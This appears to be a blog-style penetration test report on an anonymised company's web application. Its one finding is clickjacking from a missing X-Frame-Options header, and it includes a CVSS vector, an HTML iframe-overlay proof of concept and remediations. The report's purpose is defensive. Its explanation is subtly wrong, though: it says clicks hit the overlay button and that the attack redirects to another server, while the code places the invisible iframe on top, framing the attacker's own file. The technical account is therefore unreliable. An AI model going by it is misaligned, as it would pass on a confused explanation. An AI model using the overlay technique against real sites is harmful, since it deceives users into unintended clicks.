---
layout: post
title: 'IT Company Web Applicaion PT'
tags:
 - web
 - real-engagement
hero: https://images.unsplash.com/photo-1462206092226-f46025ffe607?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1474&q=80
overlay: red
---

No images (image for the step by step PoC are essential as evidence but will not be provided
) or references will be provided, as this assessment was a real engagement. Additionally, all URLs and functionalities have been anonymized to ensure privacy and compliance with non-disclosure agreements (NDAs). {: .lead} <!--break-->

# IT Company

## Type of activity and objectives
The objective of this engagement was to conduct a web application penetration test for the organization. The aim was to identify potential vulnerabilities that could potentially be exploited from the outside, with the goal of preventing unauthorized access, compromise and data exfiltration.
## Scope of evaluation
The evaluation was focused on the exposed web application. This scope encompassed assessing the security and potential vulnerabilities within this surface.
## Executive Summary 
The conducted assessment of the target web application revealed a medium security vulnerability known as "Clickjacking." Clickjacking is a type of attack where an attacker tricks a user into clicking on a maliciously embedded element while making it appear as if they are interacting with a legitimate part of the website. This can lead to unintended actions being performed by the user without their knowledge or consent.
## Finding Summary
- Clickjacking
## Attack storyline or vulnerabilities with CVSS,CVE and remedations
### Clickjacking
- CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
#### Proof of Concept (PoC)
A missing HTTP header (X-Frame-Options) in the target web application has left customers vulnerable to click jacking. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into clicking on an actionable item, such as a button or link, to another server in which they have an identical webpage. The attacker essentially hijacks the user activity intended for the original server and sends them to the other server. This is an attack on both the user and the server.

Here's a simple Proof of Concept (PoC) for the Clickjacking attack:

1. Create an HTML page that contains your legitimate content. Let's call it "legit.html":
```html
<!DOCTYPE html>
<html>
<head>
    <title>Legitimate Page</title>
</head>
<body>
    <h1>Welcome to Our Website</h1>
    <p>This is some important content.</p>
</body>
</html>
```

1. Create another HTML page that contains an invisible iframe that overlays the legitimate content. Let's call it "malicious.html":
```html
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
        }
    </style>
</head>
<body>
    <iframe src="legit.html"></iframe>
    <h1>Click Me!</h1>
    <button onclick="performAttack()">Click Here</button>

    <script>
        function performAttack() {
            alert("Clickjacking Attack Successful!");
        }
    </script>
</body>
</html>
```

In this PoC, the "malicious.html" page contains an invisible iframe that loads the "legit.html" page. The attacker overlays a button on top of the iframe that seems harmless to the user. When the user clicks the button, they are actually clicking on the button in the overlaying "malicious.html" page, triggering the "performAttack()" function that shows an alert.


#### Remediations
- X-Frame-Options Header: Set the X-Frame-Options HTTP response header to prevent your website from being displayed within a frame or iframe on another site.

- Content Security Policy (CSP): Implement a CSP that restricts the domains that can embed your site's content. This helps prevent unauthorized embedding.

- Frame-Busting Scripts: Include frame-busting scripts in your web pages to break out of frames if your site is being framed by malicious sites.